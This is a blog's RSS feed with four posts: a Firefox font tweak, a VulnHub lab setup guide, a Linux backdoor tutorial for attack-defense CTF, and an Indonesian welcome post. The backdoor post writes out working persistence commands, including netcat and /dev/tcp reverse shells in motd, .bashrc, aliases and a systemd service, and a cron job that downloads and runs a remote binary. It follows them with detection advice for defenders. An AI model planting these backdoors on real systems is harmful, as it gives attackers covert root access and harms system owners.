<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>coretan on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/categories/coretan/</link>
    <description>Recent content in coretan on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Sun, 06 Jun 2021 22:08:49 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/categories/coretan/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Font Smoothing in Firefox</title>
      <link>https://fahmifj.github.io/blog/font-smoothing-in-firefox/</link>
      <pubDate>Sun, 06 Jun 2021 22:08:49 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/font-smoothing-in-firefox/</guid>
      <description>For Web development, I prefer Firefox, particularly I like the right-click + Q shortcut for inspecting elements. However, there is one issue that bothers me/my eyes.
It&amp;rsquo;s the font smoothing!
Somehow, Firefox renders fonts as if it&amp;rsquo;s in high contrast mode or without anti-alias. So in this post, I&amp;rsquo;ll share what I&amp;rsquo;ve found as a workaround to &amp;lsquo;fix&amp;rsquo; that.
Open Firefox and type about:config in the address bar.
 Search for this string.</description>
      <content:encoded><![CDATA[<p>For Web development, I prefer Firefox, particularly I like the right-click + Q shortcut for inspecting elements. However, there is one issue that bothers me/my eyes.</p>
<p>It&rsquo;s the font smoothing!</p>
<p>Somehow, Firefox renders fonts as if it&rsquo;s in high contrast mode or without anti-alias. So in this post, I&rsquo;ll share what I&rsquo;ve found as a workaround to &lsquo;fix&rsquo; that.</p>
<p>Open Firefox and type <code>about:config</code> in the address bar.</p>
<p><div class="img-container"><img src="imgs/image-20210606221033823.png" alt="image-20210606221033823"  /></div>
</p>
<p>Search for this string.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gfx.font_rendering.cleartype_params.enhanced_contrast
</code></pre></div><p>Change the value to 0.</p>
<p><div class="img-container"><img src="imgs/image-20210606221107000.png" alt="image-20210606221107000"  /></div>
</p>
<p>Result ðŸ”½</p>
<p><div class="img-container"><img src="imgs/image-20210607074639032.png" alt="image-20210607074639032"  /></div>
</p>
<p>It&rsquo;s not that smooth like in Chrome, but a little bit better ðŸ˜º.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Setup VulnHub Machines</title>
      <link>https://fahmifj.github.io/blog/setup-vulnhub-machines/</link>
      <pubDate>Mon, 31 May 2021 03:56:18 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/setup-vulnhub-machines/</guid>
      <description>Get started with boot2root!</description>
      <content:encoded><![CDATA[<p>Because the HTB OSCP-like VM list for this month hasn&rsquo;t been updated, now is a good time to add some VulnHub machine writeups.</p>
<p>Some folks out there may not know how to set up their lab yet, so in this post I&rsquo;ll share how to.</p>
<p><em>But there is already a lot of tutorials out there?</em></p>
<p>True, but by doing this will broaden the coverage!</p>
<h2 id="00-install-your-virtualization-software">00. Install your virtualization software</h2>
<p>First thing first, you need a virtualization software such as VirtualBox or VMWare. Here is the links for both software:</p>
<ul>
<li>VirtualBox - <a href="https://www.virtualbox.org/wiki/Downloads">https://www.virtualbox.org/wiki/Downloads</a></li>
<li>VMWare - <a href="https://www.vmware.com/products/workstation-player.html">https://www.vmware.com/products/workstation-player.html</a></li>
</ul>
<p>I personally use VirtualBox (Windows) because it&rsquo;s easy to use (and of course, it&rsquo;s free), but I&rsquo;ll update this post if I got another license of VMWare.</p>
<h2 id="01-download-vm-images--ova">01. Download VM images / OVA</h2>
<p>I&rsquo;ll assume that you&rsquo;ve downloaded and installed a VirtualBox.</p>
<p>You can now download the VM images, they are available at VulnHub&rsquo;s official site: <a href="https://www.vulnhub.com/">https://www.vulnhub.com/</a>.</p>
<p><div class="img-container"><img src="imgs/image-20210531055642315.png" alt="image-20210531055642315"  /></div>
</p>
<p>For this example, I&rsquo;ll be using <strong>symfonos: 2</strong>.</p>
<h2 id="02-import-the-image">02. Import the image</h2>
<p>For the images, if it&rsquo;s on <code>7z</code> or  <code>zip</code> format make sure to decompress it first. In my case, because <strong>symfonos: 2</strong> is on <code>7z</code> format, I have to decompress it.</p>
<p>Here&rsquo;s what I have after decompressing it.</p>
<p><div class="img-container"><img src="imgs/image-20210531060413952.png" alt="image-20210531060413952"  /></div>
</p>
<p>Because the <code>.ovf</code> file has been associated with VirtualBox, we can just double click on that file. It&rsquo;ll bring us straight to the import menu.</p>
<p><div class="img-container"><img src="imgs/image-20210531060734397.png" alt="image-20210531060734397"  /></div>
</p>
<p>To do that manually, open up your VirtualBox then click on the <strong>File</strong> menu -&gt; select &ldquo;Import Appliance&hellip;&rdquo;. It will pop a new window.</p>
<p><div class="img-container"><img src="imgs/image-20210531061142323.png" alt="image-20210531061142323"  /></div>
</p>
<p>Click on the icon that marked with red box to browse your VM images.</p>
<p><div class="img-container"><img src="imgs/image-20210531061327937.png" alt="image-20210531061327937"  /></div>
</p>
<p>Locate your VM images and then click on the <strong>Open</strong> button.</p>
<p><div class="img-container"><img src="imgs/image-20210531061601700.png" alt="image-20210531061601700"  /></div>
</p>
<p>For now let&rsquo;s leave all the settings to its default.</p>
<p><div class="img-container"><img src="imgs/image-20210531061941128.png" alt="image-20210531061941128"  /></div>
</p>
<p>Click on the <strong>Import</strong> button and wait until it completed.</p>
<p><div class="img-container"><img src="imgs/image-20210531062110160.png" alt="image-20210531062110160"  /></div>
</p>
<p>When the import is done, you will see the machine on the VM list section</p>
<p><div class="img-container"><img src="imgs/image-20210531062327615.png" alt="image-20210531062327615"  /></div>
</p>
<h2 id="03-setup-vm-network">03. Setup VM network</h2>
<p>Here is the core part, putting the VM in an isolated network.</p>
<p>Open the VM&rsquo;s settings by right click and choose &ldquo;Settings&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210531062432466.png" alt="image-20210531062432466"  /></div>
</p>
<p>Go to the <strong>Network</strong> section, and set the &ldquo;Attached to&rdquo; to <code>Host-only Adapter</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210531062849952.png" alt="image-20210531062849952"  /></div>
</p>
<p>Click OK button.</p>
<p>Now open the adapter configuration on the <strong>File</strong> menu &ndash;&gt; select &ldquo;Host Network Manager&hellip;&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210531065114863.png" alt="image-20210531065114863"  /></div>
</p>
<p>Here, in my case the <code>VirtualBox Host-Only Ethernet Adapter</code> will be using network range of <code>192.168.2.0/24</code> has DHCP server enabled. With that, IP address of each machine will be assigned automatically on boot.</p>
<p><div class="img-container"><img src="imgs/image-20210531065555859.png" alt="image-20210531065555859"  /></div>
</p>
<p><code>192.168.2.2</code> is the IP address of the virtual adapter on the host side while <code>192.168.2.1</code> is the IP address of the built-in DHCP server from VirtualBox. Below is the configuration for the DHCP server.</p>
<p><div class="img-container"><img src="imgs/image-20210531065945260.png" alt="image-20210531065945260"  /></div>
</p>
<p>I set my <code>Lower Address Bound</code>  to <code>192.168.2.100</code> and <code>Upper Address Bound</code> to <code>192.168.2.254</code>, so that all machines will be assigned with an IP started from <code>.100-254</code>, and no one gets <code>192.168.2.3-99</code>.</p>
<p><em>Can I configure it to <code>10.10.10.0/24</code>?</em></p>
<p>Yes you can!</p>
<p>If we want to create a <code>10.10.10.0/24</code> network, it&rsquo;s better to create another adapter by clicking the <strong>Create</strong> menu (you don&rsquo;t say) then set the adapter&rsquo;s settings with</p>
<ul>
<li>IPv4 Address: <code>10.10.10.2</code> (Adapter on the host side)</li>
<li>IPv4 Network Mask: <code>255.255.255.0</code></li>
</ul>
<p><div class="img-container"><img src="imgs/image-20210531072801277.png" alt="image-20210531072801277"  /></div>
</p>
<p>Next, configure the DHCP server to:</p>
<ul>
<li>Server Address: <code>10.10.10.1</code> (VirtualBox&rsquo;s built-in DHCP server)</li>
<li>Server Mask: <code>255.255.255.0</code></li>
<li>Lower Address Bound: <code>10.10.10.100</code></li>
<li>Upper Address Bound: <code>10.10.10.254</code></li>
</ul>
<p><div class="img-container"><img src="imgs/image-20210531072833605.png" alt="image-20210531072833605"  /></div>
</p>
<p>Then, on the VM settings (symfonos: 2), change the adapter name with the new one we created before</p>
<p><div class="img-container"><img src="imgs/image-20210531072939206.png" alt="image-20210531072939206"  /></div>
</p>
<p>Lastly, we should also configure the attacking machine to use the same network adapter.</p>
<p><div class="img-container"><img src="imgs/image-20210531075306992.png" alt="image-20210531075306992"  /></div>
</p>
<h2 id="04-boot-it">04. Boot it!</h2>
<p>Boot your machines and we&rsquo;re done!</p>
<p><div class="img-container"><img src="imgs/image-20210531075144142.png" alt="image-20210531075144142"  /></div>
</p>
<p>Happy hacking!</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Linux Backdoors and Where to Find Them</title>
      <link>https://fahmifj.github.io/blog/linux-backdoors-and-where-to-find-them/</link>
      <pubDate>Tue, 25 May 2021 18:49:35 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/linux-backdoors-and-where-to-find-them/</guid>
      <description>Learn some backdoor techniques and how to deal with them!</description>
      <content:encoded><![CDATA[<p>In Attack-Defense CTF, leaving backdoors is an important part of maintaining access on the target system. As a result, learning some of the backdoor techniques is essential, not only for attackers but also for defenders.</p>
<h2 id="backdoors-what-is-it">Backdoors, what is it?</h2>
<p>What exactly is a backdoor?</p>
<p>Well, I&rsquo;m not going to go into as much detail as <a href="https://en.wikipedia.org/wiki/Backdoor_(computing)">Wikipedia</a>, but here&rsquo;s:</p>
<p>A backdoor is a hidden piece of code, script, or a program that is placed on a system for persistence purposes, with that you donâ€™t have to exploit the same system twice. It simply gives you quicker and instant access to the system.</p>
<p>Now that we know what a backdoor is, itâ€™s time to find out where attackers typically hide them in a <strong>Linux</strong> system. Iâ€™ll be using the <a href="https://www.vulnhub.com/entry/pinkys-palace-v1,225/">Pinkyâ€™s Palace</a> machine from VulnHub and letâ€™s pretend it has been compromised by attackers.</p>
<h3 id="1-ssh-keys">1. SSH keys</h3>
<p>When the attackers insert their public keys into one of the user&rsquo;s or root&rsquo;s <code>authorized_keys</code> file, it can be considered as a backdoor.</p>
<p>For example, below are the exploitation steps to gain root access on the target system (Pinky&rsquo;s Palace).</p>
<p><div class="img-container"><img src="imgs/image-20210526004056632.png" alt="image-20210526004056632"  /></div>
</p>
<p>Of course, as an attacker, I donâ€™t want to repeat all those exploitation steps all over again.</p>
<p>So instead, on my attacking machine, Iâ€™ll generate a new pair of <a href="https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54">SSH keys</a> specialized for backdoor.</p>
<p><div class="img-container"><img src="imgs/image-20210526004747293.png" alt="image-20210526004747293"  /></div>
</p>
<p>And then, I can insert the newly generated public key (<code>backdoor_ssh.pub</code>) into the rootâ€™s or userâ€™s  <code>authorized_keys</code> file of the compromised system.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text"># echo &#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILaxTiK3WJJ422K1yf/9yXFWBeWV6mpZxMEualO2uIul root@kali&#39; &gt; /root/.ssh/authorized_keys
</code></pre></div><p>Now by specifying <code>backdoor_ssh</code> as the identity file (private key), Iâ€™m able to gain access on the compromised system via SSH instantly.</p>
<p><div class="img-container"><img src="imgs/image-20210526005156382.png" alt="image-20210526005156382"  /></div>
</p>
<h3 id="2-ssh-motd">2. SSH motd</h3>
<p>This is one of the cool tricks I&rsquo;ve learned from HackTheBox machine called Traceback.</p>
<p>Motd (Message of the day) is the banner that appears when you log into the machine using SSH. For Ubuntu/Debian motd can be found at <code>/etc/update-motd.d</code>.</p>
<p>By default, other users don&rsquo;t have write permission on that directory.</p>
<p><div class="img-container"><img src="imgs/image-20210526010220513.png" alt="image-20210526010220513"  /></div>
</p>
<p>From the image above, there is only one motd script called <code>10-uname</code>.</p>
<p>As an attacker, I could place a new script there as a backdoor. For example, I&rsquo;ll put a reverse shell script called <code>20-backdoor</code> using <strong>netcat</strong>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@pinkys-palace:/etc/update-motd.d# echo -e &#39;#!/bin/sh\nnc 192.168.2.103 9001 -e /bin/bash &amp;&#39; &gt; 20-backdoor &amp;&amp; chmod +x 20-backdoor
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210526010934360.png" alt="image-20210526010934360"  /></div>
</p>
<p>But wait, I logged in using pinky. How did I end up with a root shell?</p>
<p>Here is the <a href="http://manpages.ubuntu.com/manpages/xenial/en/man5/update-motd.5.htm">answer</a>:</p>
<blockquote>
<p>&hellip;</p>
<p>â€‹       Executable scripts in /etc/update-motd.d/* are executed by pam_motd(8) as the root user at
â€‹       each  login,  and  this information is concatenated in /var/run/motd.  The order of script
â€‹       execution is determined by the run-parts(8) &ndash;lsbsysinit  option  (basically  alphabetical
â€‹       order, with a few caveats).</p>
<p>&hellip;</p>
</blockquote>
<h3 id="3-users-bashrc---interactive-session">3. User&rsquo;s .bashrc - Interactive session</h3>
<p><code>.bashrc</code> is one of the startup scripts used by Bourne shell aka <code>bash</code>. If there is a user who uses <code>bash</code> as their login shell, then it gets executed for each interactive session they launch.</p>
<p>Here is some actions that triggers an interactive session:</p>
<p><div class="img-container"><img src="imgs/image-20210526005325944.png" alt="image-20210526005325944"  /></div>
</p>
<p>At the image above, I inserted a non malicious line script <code>echo &quot;I'm triggered&quot;</code> to my <code>.bashrc</code>. But now, as an attacker, I can put a reverse shell there and then I&rsquo;ll just wait for someone to log in to trigger it.</p>
<pre><code>pinky@pinkys-palace:~$ echo 'nc 192.168.2.103 9001 -e /bin/bash &gt;/dev/null &amp;' &gt; .bashrc
</code></pre><p><div class="img-container"><img src="imgs/image-20210525220025256.png" alt="image-20210525220025256"  /></div>
</p>
<p>In the image above, I switched from <code>root</code> to user <code>pinky</code> and put a reverse shell on pinky&rsquo;s <code>.bashrc</code> file. I exited pinky&rsquo;s shell and immediately switch again to user <code>pinky</code> to trigger an interactive session.</p>
<h3 id="4-users-bashrc---aliases">4. User&rsquo;s .bashrc - Aliases</h3>
<p>As an attacker, I can also put the backdoor in the users' aliases!</p>
<p>Here is the example of a backdoored <code>cd</code>.</p>
<pre><code>root@pinkys-palace:~# alias cdalias cd='$(nc 192.168.2.103 9001 -e /bin/bash&amp;); cd'
</code></pre><p><div class="img-container"><img src="imgs/image-20210526002305189.png" alt="image-20210526002305189"  /></div>
</p>
<p>Some other tricky backdoor using alias:</p>
<ul>
<li><a href="https://github.com/nisay759/sudo-backdoor">https://github.com/nisay759/sudo-backdoor</a></li>
<li><a href="https://gist.github.com/ahhh/1d4bf832c5a88cc75adb">https://gist.github.com/ahhh/1d4bf832c5a88cc75adb</a></li>
</ul>
<h3 id="5-cron-jobs">5. Cron jobs</h3>
<p>Cron is a feature from Linux/UNIX-like OS that can be used to periodically perform a specific job or task just like Task Scheduler in Windows.</p>
<p>Here is the example of a backdoor using Cron job.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@pinkys-palace:~# echo &#39;* * * * * root cd /tmp; wget 192.168.2.113/backdoor &amp;&amp; chmod +x backdoor &amp;&amp; ./backdoor; rm /etc/cron.d/backdoor&#39; &gt; /etc/cron.d/backdoor
</code></pre></div><p>What the task above does is it will download a backdoor that is hosted on my attacking machine, and the backdoor then gets executed every minute.</p>
<p><div class="img-container"><img src="imgs/image-20210525222500077.png" alt="image-20210525222500077"  /></div>
</p>
<h3 id="6-backdoor-as-a-service-baas">6. Backdoor as a Service (BaaS)</h3>
<p>An attacker can also create a backdoor as a service (BaaS) *I&rsquo;m joking, but it&rsquo;s true.</p>
<p>Here is the example of BaaS typed directly in a terminal:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@pinkys-palace:/etc/systemd/system# echo &#39;
&gt; [Service]
&gt; Type=simple
&gt; User=root
&gt; ExecStart=/bin/bash -c &#34;bash -i &gt;&amp; /dev/tcp/192.168.2.103/9001 0&gt;&amp;1&#34;
&gt; [Install]
&gt; WantedBy=multi-user.target&#39;
&gt; &#39; &gt; backdoor.service
</code></pre></div><p>In a single file (<code>backdoor.service</code>):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">[Service]
Type=simple
User=root
ExecStart=/bin/bash -c &#34;bash -i &gt;&amp; /dev/tcp/192.168.2.103/9001 0&gt;&amp;1&#34;
[Install]
WantedBy=multi-user.target&#39;
</code></pre></div><p>When the service is started, it launches a reverse shell to the attacker.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@pinkys-palace:/etc/systemd/system# systemctl start backdoor.service
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210526013637397.png" alt="image-20210526013637397"  /></div>
</p>
<p>It can be enabled on boot too.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@pinkys-palace:/etc/systemd/system# systemctl enable backdoor.service
</code></pre></div><h3 id="7-suid">7. SUID</h3>
<p>The last one on this post is SUID.</p>
<p>As an example, I can make a copy of bash called <code>.backdoor</code> (notice the dot) to a low privilege user but has been compromised,  and then set SUID permission on it.</p>
<p><div class="img-container"><img src="imgs/image-20210526020936681.png" alt="image-20210526020936681"  /></div>
</p>
<p>Why do I add dot?</p>
<p>Well, this is based on my observation on some people out there. They tend to just use <code>ls -l</code> rather than <code>ls -la</code>, and this becomes an advantage for attackers to put a backdoor with a dot.</p>
<p>Itâ€™s not just about SUID though, it applies to other backdoors as well (<em>cough</em> and <code>.git</code> folder <em>cough</em>)</p>
<h2 id="blue-team-side">Blue Team side</h2>
<p>Before reading further, Iâ€™ll state that if your server (irl) gets hacked, itâ€™s better to restore the serverâ€™s backup or completely rebuild it from scratch, because in the real world, those backdoors can be obfuscated and combined with other techniques (not to mention there might be a rootkit too), which makes it difficult to detect/find.</p>
<p>Also what I share here might not be that effective but, but here is how I usually deal with those backdoors in attack-defense CTF.</p>
<h3 id="ssh-keys-and-bashrc">SSH keys and .bashrc.</h3>
<p>Make sure to regularly check the all the users <code>authorized_keys</code> file.</p>
<p>In the image below, there is a public key with a foreign hostname <code>kali</code> instead of <code>pinkys-palace</code>, then you should suspect it.</p>
<p><div class="img-container"><img src="imgs/image-20210605091730851.png" alt="image-20210605091730851"  /></div>
</p>
<p>Well, actually, the attackers might have tricked it to look like it was a legitimate one.</p>
<p>My workaround here is why donâ€™t we create a â€˜skeletonâ€™ file of all the <code>authorized_keys</code> files and set a Cronjob which automatically reverts those files back to its original state, and I might perform it remotely via <code>scp</code>. This can be applied as well to handle backdoor in <code>.bashrc</code> .</p>
<blockquote>
<p>You can find the skeleton file of <code>.bashrc</code> at <code>/etc/skel</code>.</p>
</blockquote>
<h3 id="ssh-motd">SSH motd</h3>
<p>It&rsquo;s not always placed on <code>/etc/update-motd.d</code> but make sure the <strong>motd</strong> directory is only writable by root, note the default list of <strong>motd</strong> files and apply the same thing as above (skeleton file) because attackers might have inserted backdoor in the original file.</p>
<p>We could also do some &lsquo;forensics&rsquo; using timestamp:</p>
<pre><code>root@MSI:/etc/update-motd.d# ls --full-time
</code></pre><p>For example, those files with the timestamp <code>000000000</code> (nano) in the image below have most likely not been modified and are still in their original state.</p>
<p><div class="img-container"><img src="imgs/image-20210605092751344.png" alt="image-20210605092751344"  /></div>
</p>
<p>After inserting a non-malicious line, the timestamp changed. From here, it&rsquo;s safe to assume that someone/something has modified it.</p>
<p><div class="img-container"><img src="imgs/image-20210605093121574.png" alt="image-20210605093121574"  /></div>
</p>
<h3 id="cronjobs-and-services">Cronjobs and Services</h3>
<p>I think monitoring the process using  <code>netstat</code> and <code>ps</code> command is enough for this. Anything that looks like a reverse shell or a bind shell is definitely suspicious.</p>
<p>To find an unwanted open port we can use this command:</p>
<pre><code>netstat -antp | grep LISTEN
</code></pre><p>To find a suspicious  connection we can use this command:</p>
<pre><code>netstat -antp | grep ESTABLISHED
</code></pre><p><div class="img-container"><img src="imgs/image-20210526034616621.png" alt="image-20210526034616621"  /></div>
</p>
<p>Sometimes the state of a backdoor is neither ESTABLISHED nor LISTEN but SYN_SENT. That happens because the backdoor tries to send a reverse shell out but the attacker didnâ€™t catch or fail to catch it.</p>
<p>To find that, at the <code>grep</code> side, we can just change ESTABLISHED or LISTEN to SYN_SENT</p>
<pre><code>netstat -antp | grep SYN_SENT
</code></pre><p>There is also the <code>ps -f</code> command which is pretty good at visualizing the process tree. For example, here we know that the culprit that keeps opening the HTTPS port (443) is probably on <code>.bashrc</code> file because it gets triggered every time we launch a bash shell (interactive session).</p>
<p><div class="img-container"><img src="imgs/image-20210526034217561.png" alt="image-20210526034217561"  /></div>
</p>
<h3 id="finding-suid">Finding SUID</h3>
<p>To find some suspicious SUID we can use the <code>find</code> commands. It can also detect the SUID that started with dot!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@pinkys-palace:/etc/update-motd.d# find / -type f -perm 4755 2&gt;/dev/null
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210526035623660.png" alt="image-20210526035623660"  /></div>
</p>
<p>So that&rsquo;s all for today.</p>
<hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54">https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54</a></li>
<li><a href="https://blog.g0tmi1k.com/2011/08/kioptrix-level-3/">https://blog.g0tmi1k.com/2011/08/kioptrix-level-3/</a></li>
<li><a href="https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c">https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c</a></li>
<li><a href="https://gist.github.com/ahhh/1d4bf832c5a88cc75adb">https://gist.github.com/ahhh/1d4bf832c5a88cc75adb</a></li>
<li><a href="https://ippsec.rocks/?#">https://ippsec.rocks/?#</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>EHLO world</title>
      <link>https://fahmifj.github.io/blog/hello-world/</link>
      <pubDate>Sat, 27 Mar 2021 22:36:47 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/hello-world/</guid>
      <description>Halo, selamat datang di post pertama blog ini!
Saya Fahmi, empunya blog :D
Sedikit cerita, blog ini merupakan blog yang ke-4 (5 deh kalau Tumblr dihitung :D) tapi blog yang pertama pakai static-site generator.
Setelah vakum lama dari blogging, diakhir tahun 2019 baru mulai lagi pakai Medium dan dari nol. Blog yang lama terlanjur bala dengan tugas kampus soalnya. Terlebih kalau pake blogger kaya balik lagi ke 2012, jadi tak arsipkan itu blog.</description>
      <content:encoded><![CDATA[<p>Halo, selamat datang di post pertama blog ini!</p>
<p>Saya Fahmi, empunya blog :D</p>
<p>Sedikit cerita, blog ini merupakan blog yang ke-4 (5 deh kalau Tumblr dihitung :D) tapi blog yang pertama pakai <em>static-site generator</em>.</p>
<p>Setelah vakum lama dari blogging, diakhir tahun 2019 baru mulai lagi pakai Medium dan dari nol. Blog yang lama terlanjur <em>bala</em> dengan tugas kampus soalnya. Terlebih kalau pake blogger kaya balik lagi ke 2012, jadi tak arsipkan itu blog.</p>
<p>Udah satu tahun lebih nulis di <a href="https://fahmifj.medium.com/">Medium</a>, ternyata jenuh juga sama <em>minimalist</em>-nya Medium. <em>Formatting</em>-nya terbatas apalagi untuk <em>paste-paste</em> kode, dan terakhir kampret momennya itu sering <em>error</em> pas akhir-akhir mau di &ldquo;Publish&rdquo;. Jadi dibuatlah blog ini, walau tadinya sih iseng coba-coba pakai <em>static-site generator</em> tapi ternyata enak dan gampang di-<em>manage</em>-nya.</p>
<p>Isi blognya?</p>
<p>Untuk saat ini isinya baru coretan-coretan kaya gini dan mindahin <em>write-up</em> HackTheBox dari Medium yang juga dipoles ulang biar lebih jelas alurnya. Mungkin ditambah sama write-up dari TryHackMe sampai VulnHub yang fokusnya ke boot2root terutama mesin-mesin yang ada di list <a href="https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#">OSCP-likenya TJNull</a> sih. Yah, pokoknya <em>gak</em> jauh-jauh dari IT deh.</p>
<p>Wah panjang juga ya &ndash;&quot;, mungkin <em>stop</em> sampai sini dulu~</p>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
